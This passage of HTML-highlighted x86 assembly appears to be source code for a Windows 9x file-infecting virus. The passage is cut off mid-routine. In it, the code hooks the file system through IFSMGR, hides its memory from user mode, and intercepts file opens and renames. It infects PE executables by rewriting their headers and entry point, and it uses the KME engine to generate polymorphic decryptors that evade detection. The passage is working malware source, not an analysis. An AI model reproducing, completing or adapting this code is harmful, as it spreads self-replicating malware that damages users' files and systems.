                        </span><span class="sc1">; restore previously converted VxDcall</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">restvxdc</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">vircopy</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20CDh</span><span class="sc0">
                        </span><span class="sc6">stosw</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VMM</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PageAllocate</span><span class="sc0">
                        </span><span class="sc6">stosd</span><span class="sc0">

</span><span class="sc1">; protect memory from ring3-access</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
                        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">

                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PC_STATIC</span><span class="sc0">                       </span><span class="sc1">; OR_MASK</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">PC_WRITEABLE</span><span class="sc4">+</span><span class="sc5">PC_USER</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">; AND_MASK</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">virpages</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc5">VMMcall</span><span class="sc0"> </span><span class="sc5">PageModifyPermissions</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc1">; install file system handler</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ifs_handler</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc5">VxDcall</span><span class="sc0"> </span><span class="sc5">IFSMGR</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">InstallFileSystemApiHook</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">old_ifs_handler_ptr_ptr</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">; install io service to provide i-am-here function</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">iocallback</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IO_DX</span><span class="sc0">
                        </span><span class="sc5">VMMcall</span><span class="sc0"> </span><span class="sc5">Install_IO_Handler</span><span class="sc0">

</span><span class="sc1">; done</span><span class="sc0">

</span><span class="sc5">__exit</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; io handler</span><span class="sc0">

</span><span class="sc5">iocallback</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IO_DX</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__exit</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IO_AL</span><span class="sc0">
</span><span class="sc5">__exit</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; input:  EDI=file name</span><span class="sc0">
</span><span class="sc1">; output: EAX=-ext</span><span class="sc0">

</span><span class="sc5">getext</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MAXPATH</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                        </span><span class="sc6">cld</span><span class="sc0">
                        </span><span class="sc6">repnz</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20202000h</span><span class="sc0">
                        </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">EXT_EXE</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">; IFS handler</span><span class="sc0">

</span><span class="sc5">ifs_handler</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_base_ebp</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">ifs_handler_entered</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__quit</span><span class="sc0">
                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc5">ifs_handler_entered</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc5">._function</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IFSFN_OPEN</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__my_func</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IFSFN_RENAME</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__my_func</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IFSFN_FILEATTRIB</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__my_func</span><span class="sc0">

</span><span class="sc5">__exit</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc5">ifs_handler_entered</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">

</span><span class="sc5">__quit</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">old_ifs_handler_ptr_ptr</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">; IFSFN_xxx handler</span><span class="sc0">

</span><span class="sc5">__my_func</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">pusha</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">filename</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">cld</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc5">._drive</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0">

                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                        </span><span class="sc6">jle</span><span class="sc0">     </span><span class="sc5">__skip</span><span class="sc0">

</span><span class="sc1">; build file name</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'A'</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">':'</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc5">._ioreq_ptr</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; eax &lt;-- filename</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">          </span><span class="sc1">; skip "</span><span class="sc0">

                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc5">._codepage</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc0"> </span><span class="sc1">; BCS_WANSI/BCS_OEM</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MAXPATH</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; max name length</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; uni-str</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">; output-str</span><span class="sc0">
                        </span><span class="sc5">VxDcall</span><span class="sc0"> </span><span class="sc5">IFSMGR</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">UniToBCSPath</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">

                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">        </span><span class="sc1">; converted normally?</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">__skip</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">   </span><span class="sc1">; NUL</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_file</span><span class="sc0">

</span><span class="sc5">__skip</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__exit</span><span class="sc0">

</span><span class="sc1">; file infection subroutine</span><span class="sc0">
</span><span class="sc1">; input: filename variable</span><span class="sc0">

</span><span class="sc5">infect_file</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">pusha</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_base_ebp</span><span class="sc0">

</span><span class="sc1">; check file extension</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">filename</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getext</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__exit</span><span class="sc0">

                        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">

</span><span class="sc1">; open file</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">filename</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fopen</span><span class="sc0">
                        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">__exit</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">      </span><span class="sc1">; esi = offset for fread/fwrite</span><span class="sc0">

</span><span class="sc1">; process mz header</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">mz</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">mz</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fread</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__close</span><span class="sc0">

                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">mz.mz_id</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">mz</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__close</span><span class="sc0">

</span><span class="sc1">; process pe header</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">mz.mz_neptr</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pe</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">pe</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fread</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__close</span><span class="sc0">

                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pe.pe_id</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">pe</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'EP'</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__close</span><span class="sc0">

                        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc5">pe.pe_exeflags</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2000h</span><span class="sc0"> </span><span class="sc1">; dll?</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">__close</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">pe.pe_importtablerva</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; we will need it</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__close</span><span class="sc0">

</span><span class="sc1">; check if alredy infected</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">pe.pe_linkminor</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__close</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">pe.pe_linkminor</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc0">

</span><span class="sc1">; kill relocs</span><span class="sc0">

                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc5">pe.pe_exeflags</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0001h</span><span class="sc0"> </span><span class="sc1">; relocs. stripped</span><span class="sc0">

</span><span class="sc1">; calc last object entry offset</span><span class="sc0">

                        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pe.pe_numofobjects</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">oe</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">mz.mz_neptr</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0">
                        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pe.pe_ntheadersize</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">oe_offs</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">          </span><span class="sc1">; save</span><span class="sc0">

</span><span class="sc1">; read last object entry</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">oe</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">oe</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fread</span><span class="sc0">

</span><span class="sc1">; check if smb trying fuck us</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">oe.oe_virt_size</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__close</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">oe.oe_phys_size</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__close</span><span class="sc0">

</span><span class="sc1">; align section's sizes</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">oe.oe_phys_size</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pe.pe_filealign</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">oe.oe_phys_size</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">oe.oe_virt_size</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pe.pe_objectalign</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">oe.oe_virt_size</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">; esi &lt;-- our file offset</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">oe.oe_phys_offs</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">oe.oe_phys_size</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">

</span><span class="sc1">; process entrypointrva</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pe.pe_entrypointrva</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pe.pe_imagebase</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">old_eip</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">vircopy</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">),</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">oe.oe_phys_offs</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">oe.oe_virt_rva</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">pe.pe_entrypointrva</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">; call KME -- generate polymorphic decryptor</span><span class="sc0">

                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; flags</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">CMD_ALL</span><span class="sc0">         </span><span class="sc1">; cmd mask</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">REG_ALL</span><span class="sc4">-</span><span class="sc5">REG_EBP</span><span class="sc0"> </span><span class="sc1">; reg mask</span><span class="sc0">
                        </span><span class="sc5">VMMcall</span><span class="sc0"> </span><span class="sc5">Get_System_Time</span><span class="sc0"> </span><span class="sc1">; randseed</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">31</span><span class="sc0">              </span><span class="sc1">; jmps if rnd(X)==0</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">buf_entry</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc1">; [output eip]</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">buf_size</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0"> </span><span class="sc1">; [output size]</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; output filler</span><span class="sc0">
